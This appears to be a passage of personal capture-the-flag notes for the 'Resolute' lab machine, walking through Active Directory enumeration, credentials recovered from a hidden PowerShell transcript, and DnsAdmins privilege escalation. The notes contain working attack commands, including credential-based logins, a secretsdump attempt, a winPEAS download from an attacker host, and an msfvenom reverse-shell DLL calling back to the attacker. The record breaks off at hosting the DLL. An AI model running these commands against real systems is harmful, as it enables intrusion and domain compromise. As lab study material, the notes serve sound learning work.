
```
bloodhound-python -d MEGABANK.local -u melanie -p 'Welcome123!' -ns 10.10.10.169 -c all
```
![[Pasted image 20240506061911.png]]

Winpeas
```
IWR -Uri http://10.10.16.20:8080//winpeas/winPEASx64.exe -OutFile winPEASx64.exe
```
![[Pasted image 20240506062115.png]]

```
crackmapexec smb 10.10.10.169 -u melanie -p 'Welcome123!' --shares
```

So my intuition was right there is something hidden and i can smell it but don't know the command for it.
```
dir -Force
```

![[Pasted image 20240506070133.png]]

![[Pasted image 20240506070800.png]]

PS Transcripts seems fishy to meeeeeeeeeeeee 
And the interesting thing is that file is hidden again
```
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
![[Pasted image 20240506071315.png]]

Let's peak into the file and see if we can get some thing interesting from it
User
```
ryan
```

Password
```
Serv3r4Admin4cc123!
```

![[Pasted image 20240506071656.png]]


Let's evil-winrm and see the group and what we can do with it and the privileges we have
```
evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
```
![[Pasted image 20240506071911.png]]

```
secretsdump.py MEGABANK.LOCAL/ryan:'Serv3r4Admin4cc123!'@10.10.10.169
```
It didn't worked

![[Pasted image 20240506072229.png]]

So the group that stands out is DnsAdmins
![[Pasted image 20240506072623.png]]

https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b

Reverse DLL
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9001 -f dll > rev.dll
```
![[Pasted image 20240507011836.png]]

We have to use LOLbins
https://lolbas-project.github.io/

![[Pasted image 20240506081837.png]]

I think we have to host the fill remotely or i am doing something
```
impacket-smbserver Toolkit $(pwd)
```

```

```
